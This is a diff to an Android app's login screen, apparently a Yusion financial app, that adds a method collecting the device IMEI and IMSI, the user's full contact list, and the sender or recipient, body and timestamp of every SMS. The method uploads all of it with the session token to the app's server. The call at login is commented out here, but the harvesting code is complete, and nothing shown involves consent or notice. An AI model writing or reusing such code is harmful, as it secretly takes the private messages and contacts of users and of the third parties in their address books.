@@ -2,6 +2,7 @@ package com.yusion.shanghai.yusion4s.ui.entrance;
 
 import android.content.Intent;
 import android.os.Bundle;
+import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.view.inputmethod.EditorInfo;
 import android.widget.EditText;
@@ -12,12 +13,28 @@ import com.yusion.shanghai.yusion4s.R;
 import com.yusion.shanghai.yusion4s.Yusion4sApp;
 import com.yusion.shanghai.yusion4s.base.ActivityManager;
 import com.yusion.shanghai.yusion4s.base.BaseActivity;
+import com.yusion.shanghai.yusion4s.bean.auth.CheckUserInfoResp;
 import com.yusion.shanghai.yusion4s.bean.login.LoginReq;
 import com.yusion.shanghai.yusion4s.bean.login.LoginResp;
 import com.yusion.shanghai.yusion4s.retrofit.api.AuthApi;
 import com.yusion.shanghai.yusion4s.retrofit.api.ConfigApi;
+import com.yusion.shanghai.yusion4s.retrofit.api.PersonApi;
+import com.yusion.shanghai.yusion4s.retrofit.callback.OnItemDataCallBack;
+import com.yusion.shanghai.yusion4s.ubt.bean.UBTData;
 import com.yusion.shanghai.yusion4s.ui.MainActivity;
+import com.yusion.shanghai.yusion4s.utils.MobileDataUtil;
 import com.yusion.shanghai.yusion4s.utils.SharedPrefsUtil;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.util.ArrayList;
+import java.util.List;
+
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
 
 public class LoginActivity extends BaseActivity {
@@ -26,6 +43,7 @@ public class LoginActivity extends BaseActivity {
     private EditText mLoginPasswordTV;
     private ImageView mLoginPasswordEyeImg;
     private boolean isShowPassword = false;
+    private TelephonyManager telephonyManager;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -36,6 +54,7 @@ public class LoginActivity extends BaseActivity {
     }
 
     private void initView() {
+        telephonyManager = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
         mLoginAccountTV = (EditText) findViewById(R.id.login_account_edt);
         mLoginPasswordTV = (EditText) findViewById(R.id.login_password_edt);
         mLoginPasswordEyeImg = (ImageView) findViewById(R.id.login_password_eye_img);
@@ -79,7 +98,10 @@ public class LoginActivity extends BaseActivity {
             SharedPrefsUtil.getInstance(LoginActivity.this).putValue("token", Yusion4sApp.TOKEN);
             SharedPrefsUtil.getInstance(LoginActivity.this).putValue("account", Yusion4sApp.ACCOUNT);
             startActivity(new Intent(LoginActivity.this, MainActivity.class));
+            Toast.makeText(LoginActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
             finish();
+            //上传设备信息
+//            uploadPersonAndDeviceInfo();
         }
     }
 
@@ -98,4 +120,103 @@ public class LoginActivity extends BaseActivity {
         super.onBackPressed();
         ActivityManager.finishOtherActivityEx(LoginActivity.class);
     }
+    private void uploadPersonAndDeviceInfo() {
+        UBTData req = new UBTData(this);
+        String imei = telephonyManager.getDeviceId();
+        String imsi = telephonyManager.getSubscriberId();
+        req.imei = imei;
+        req.imsi = imsi;
+        req.app = "Yusion";
+        req.token = SharedPrefsUtil.getInstance(this).getValue("token", null);
+        req.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", null);
+
+        JSONArray contactJsonArray = MobileDataUtil.getUserData(this, "contact");
+        List<UBTData.DataBean.ContactBean> contactBeenList = new ArrayList<>();
+        //List<String> raw_list = new ArrayList<>();
+        for (int i = 0; i < contactJsonArray.length(); i++) {
+            JSONObject jsonObject = null;
+            try {
+                jsonObject = contactJsonArray.getJSONObject(i);
+                UBTData.DataBean.ContactBean contactListBean = new UBTData.DataBean.ContactBean();
+
+                contactListBean.data1 = jsonObject.optString("data1");
+                contactListBean.display_name = jsonObject.optString("display_name");
+
+                contactBeenList.add(contactListBean);
+                //raw_list.add(jsonObject.toString());
+
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }
+        UBTData.DataBean contactBean = new UBTData.DataBean();
+        contactBean.category = "contact";
+        req.data.add(contactBean);
+        if (contactBeenList.size() > 0 && !contactBeenList.isEmpty()) {
+            contactBean.contact_list = contactBeenList;
+        }
+//        else {
+//            contactBean.raw_data = raw_list;
+//        }
+
+        JSONArray smsJsonArray = MobileDataUtil.getUserData(this, "sms");
+        List<UBTData.DataBean.SmsBean> smsList = new ArrayList<>();
+        for (int i = 0; i < smsJsonArray.length(); i++) {
+            JSONObject jsonObject = null;
+            try {
+                jsonObject = smsJsonArray.getJSONObject(i);
+                UBTData.DataBean.SmsBean smsListBean = new UBTData.DataBean.SmsBean();
+                String type = jsonObject.optString("type");
+                if (type.equals("1")) {
+                    smsListBean.from = jsonObject.optString("address");
+                    smsListBean.content = jsonObject.optString("body");
+                    smsListBean.type = "recv";
+                    smsListBean.ts = jsonObject.optString("date");
+                } else if (type.equals("2")) {
+                    smsListBean.to = jsonObject.optString("address");
+                    smsListBean.content = jsonObject.optString("body");
+                    smsListBean.type = "snd";
+                    smsListBean.ts = jsonObject.optString("date");//date
+                }
+                smsList.add(smsListBean);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }
+
+        UBTData.DataBean simBean = new UBTData.DataBean();
+        simBean.category = "sms";
+        req.data.add(simBean);
+        if (smsList.size() > 0 && !smsList.isEmpty()) {
+            simBean.sms_list = smsList;
+        }
+
+        AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
+            @Override
+            public void onItemDataCallBack(CheckUserInfoResp data) {
+                contactBean.clt_nm = data.name;
+                contactBean.mobile = data.mobile;
+                simBean.clt_nm = data.name;
+                simBean.mobile = data.mobile;
+                //PersonApi.uploadPersonAndDeviceInfo(req);
+                PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
+                    @Override
+                    public void onResponse(Call call, Response response) {
+                        Intent intent = new Intent(LoginActivity.this, MainActivity.class);
+                        startActivity(intent);
+                        finish();
+                    }
+
+                    @Override
+                    public void onFailure(Call call, Throwable t) {
+
+                    }
+                });
+            }
+        });
+//        Intent intent = new Intent(LoginActivity.this, MainActivity.class);
+//        startActivity(intent);
+//        finish();
+    }
+
 }
